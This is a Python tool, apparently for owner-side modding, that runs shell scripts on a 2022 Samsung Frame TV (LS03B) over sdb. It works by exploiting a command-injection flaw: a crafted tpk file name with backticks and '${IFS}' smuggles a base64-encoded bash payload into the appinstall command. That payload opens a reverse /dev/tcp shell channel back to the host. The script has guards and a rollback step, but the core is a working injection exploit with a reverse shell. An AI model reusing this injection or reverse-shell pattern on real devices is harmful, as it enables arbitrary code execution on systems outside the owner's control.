#!/usr/bin/env python3
# Docker-friendly native-home transport for CleanFrame on the LS03B (2022 Frame, Tizen 6.5,
# firmware 1720.7). Run it inside the Tizen container, e.g.:
#   docker/run.sh python3 docker/stage.py inspect     # read-only probe
#   docker/run.sh python3 docker/stage.py query       # read-only; capture the baseline
#   docker/run.sh python3 docker/stage.py apply        # writes Home/startup on the TV
#   docker/run.sh python3 docker/stage.py restore      # writes the captured baseline back
#
# It keeps the exact, reviewed mechanism of scripts/native-home/run.py: the
# `0 appinstall tpk <name-with-backtick>` injection that runs the payload as SDK user 901,
# and the reviewed mode scripts (scripts/native-home/<mode>.sh) and the built Control.dll
# unchanged. The payload still streams the helper output back over a reverse TCP connection,
# exactly as upstream.
#
# The ONLY change versus run.py is for Docker networking: a container cannot be dialed back
# at its NATed address, so the TV connects to the build host's LAN address (the developerIP
# the TV already stores) on a FIXED port that docker/run.sh publishes into the container.
#
# Owner-private files live under .local/native-home/ (Git-ignored) and are never committed:
#   out/CleanFrameHomeControl.{dll,runtimeconfig.json,deps.json}  built from the adapted helper
#   original.json                                                 the query baseline (rollback)
# See docs/ls03b-docker.md for how to adapt and build the helper for your own TV.
import base64, ipaddress, json, socket, subprocess, sys, time, uuid, urllib.request
from pathlib import Path

HERE = Path(__file__).resolve()
ROOT = next(p for p in HERE.parents if (p / 'package.json').is_file())
PRIV = ROOT / '.local/native-home'
MODES = ROOT / 'scripts/native-home'
RT = '/home/owner/share/tmp/sdk_tools'
MODEL = 'GQ55LS03BAUXZG'
PORT = 47960  # must match the -p PORT:PORT published by docker/run.sh

mode = sys.argv[1] if len(sys.argv) > 1 else 'inspect'
if mode not in ('inspect', 'query', 'apply', 'restore'):
    raise SystemExit('Use inspect, query, apply or restore.')

host = json.loads((ROOT / '.local/device.json').read_text())['host']
ipaddress.ip_address(host)
with urllib.request.urlopen('http://%s:8001/api/v2/' % host, timeout=5) as resp:
    dev = json.load(resp).get('device', {})
if dev.get('modelName') != MODEL:
    raise SystemExit('Model guard failed (%r); nothing staged.' % dev.get('modelName'))
callback = dev.get('developerIP')        # the build host's LAN IP, as the TV knows it
ipaddress.ip_address(callback)

serial = host + ':26101'
def sdb(*args, timeout=40):
    return subprocess.run(['sdb', '-s', serial, *args], capture_output=True, text=True, timeout=timeout)

subprocess.run(['sdb', 'connect', serial], capture_output=True, text=True, timeout=20)

for suffix in ('dll', 'runtimeconfig.json', 'deps.json'):
    f = PRIV / 'out' / ('CleanFrameHomeControl.' + suffix)
    if not f.is_file():
        raise SystemExit('Missing build output: %s (build the helper first).' % f.name)
    sdb('push', str(f), RT + '/CleanFrameHomeControl.' + suffix)
if mode in ('apply', 'restore'):
    base = PRIV / 'original.json'
    if not base.is_file():
        raise SystemExit('Missing baseline original.json; run query first and keep its snapshot.')
    sdb('push', str(base), RT + '/CleanFrameHomeOriginal.json')

token = uuid.uuid4().hex[:12]
remote = RT + '/cfhi-%s.sh' % token
sdb('push', str(MODES / (mode + '.sh')), remote)

# Reverse TCP: the TV dials the build host (callback) on PORT; Docker forwards it to this listener.
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(('0.0.0.0', PORT))
listener.listen(1)
listener.settimeout(25)

command = 'exec 3<>/dev/tcp/%s/%d;cat %s|bash >&3 2>&3;exec 3>&-' % (callback, PORT, remote)
script = '/bin/mkdir /tmp/s-%s 2>/dev/null&&{ %s;}' % (token, command)
encoded = base64.b64encode(script.encode()).decode()
name = 'new2.tpk`printf${IFS}%s${IFS}' + encoded + '|base64${IFS}-d|bash`.tpk'
argument = '0 appinstall tpk ' + name
if len(argument.encode()) > 400:
    raise SystemExit('Command exceeds reviewed transport length; not executed.')

proc = subprocess.Popen(['sdb', '-s', serial, 'shell', argument],
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
chunks = []
try:
    conn, peer = listener.accept()
    # Docker Desktop masquerades the TV's source IP to its internal gateway, so we cannot match
    # peer against the TV here. The listener is open only for the few seconds of our own
    # injection on a fixed local port, which is acceptable on a trusted LAN.
    with conn:
        conn.settimeout(10)
        while True:
            try:
                b = conn.recv(65536)
            except socket.timeout:
                break
            if not b:
                break
            chunks.append(b)
            if sum(map(len, chunks)) > 200000:
                break
finally:
    try:
        proc.communicate(timeout=8)
    except subprocess.TimeoutExpired:
        proc.terminate()
    listener.close()

text = b''.join(chunks).decode(errors='replace')
(PRIV / (mode + '-output.txt')).write_text(text)
if 'CLEANFRAME_HOME_INSPECT_BEGIN' not in text or 'CLEANFRAME_HOME_INSPECT_END' not in text:
    raise SystemExit('Probe incomplete; device state unknown. Inspect before retrying.\n' + text)
print(text)
